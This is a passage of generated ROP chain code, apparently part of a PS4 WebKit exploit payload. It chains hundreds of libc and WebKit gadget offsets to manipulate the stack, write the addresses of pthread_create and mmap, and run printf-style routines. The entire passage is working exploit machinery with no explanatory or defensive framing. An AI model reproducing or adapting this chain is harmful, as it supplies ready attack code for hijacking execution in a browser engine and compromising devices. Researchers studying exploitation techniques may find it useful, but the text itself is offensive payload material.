libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
pthread_create_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+158944, //L2348
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2348:
db([0, 0]); // 0x0
//L2121:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
mmap_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160272, //L2349
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2349:
db([0, 0]); // 0x0
//_printf_:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160344, //L2350
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2350:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160408, //L2352
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2352:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160504, //L2354
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+160520, //L2355
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2354:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2355:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160632, //L2356
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+160616, //L2357
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2357:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2356:
db([0, 0]); // 0x0
//__putchar:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+160704, //L2358
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160808, //L2360
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+160792, //L2362
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2362:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L2360:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2361:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+160936, //L2365
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+160920, //L2364
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2364:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2365:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+161072, //L2368
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161056, //L2367
webkit_base+7438103, //mov [rsi], rax
libc_base+206806, //pop rdi
//L2366:
ropchain+136, //_ps4_printf_fd
libc_base+792472 //pop rcx
]);
//L2367:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2368:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+161224, //L2370
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161256, //L2372
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+161208, //L2369
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161240, //L2371
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2369:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2370:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2371:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2372:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161328, //L2373
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161344, //L2374
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2373:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161464, //L2376
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161480, //L2377
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+161448, //L2375
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2375:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2376:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2377:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+161648, //L2379
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161664, //L2380
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161632, //L2378
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2378:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2379:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2380:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+161768, //L2382
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+161816, //L2385
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+161784, //L2383
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2382:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2383:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2384:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2385:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+161928, //L2386+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+161920, //L2386
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2386:
db([0, 0]); // 0x0
set_gadgets([
ropchain+161944, //L2386+24
ropchain+162768, //L2381
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+161984, //L2387
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2387:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2388:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2389:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+162112, //L2391
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+162096, //L2390
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2390:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2391:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+162208, //L2393
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2392:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+162352, //L2396
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162336, //L2395
webkit_base+7438103, //mov [rsi], rax
libc_base+206806, //pop rdi
//L2394:
ropchain+136, //_ps4_printf_fd
libc_base+792472 //pop rcx
]);
//L2395:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2396:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+162504, //L2398
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+162536, //L2400
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+162488, //L2397
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162520, //L2399
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2397:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2398:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2399:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+162632, //L2402
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+162616, //L2401
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2401:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2402:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2404:
ropchain+162736, //L2403
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+165152, //L2405
//L2403:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L2381:
libc_base+793877, //pop rsi
ropchain+162824, //L2407
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2406:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+162912, //L2409
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+162928, //L2410
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2409:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2410:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+163088, //L2415
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+163040, //L2412
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163056, //L2413
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2412:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2413:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2414:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2415:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163144, //L2416
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2416:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+163248, //L2418
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163280, //L2420
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163264, //L2419
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2418:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2419:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2420:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163440, //L2424
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163392, //L2421
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163408, //L2422
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2421:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2422:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2423:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163496, //L2425
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2425:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+163600, //L2427
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163632, //L2429
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163616, //L2428
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2427:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2428:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2429:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163704, //L2430
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+163720, //L2431
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2430:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2431:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+163880, //L2435
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+163832, //L2432
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+163848, //L2433
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2432:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2433:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2434:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2435:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+163936, //L2436
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2436:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+164040, //L2438
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+164072, //L2440
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+164056, //L2439
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2438:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2439:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
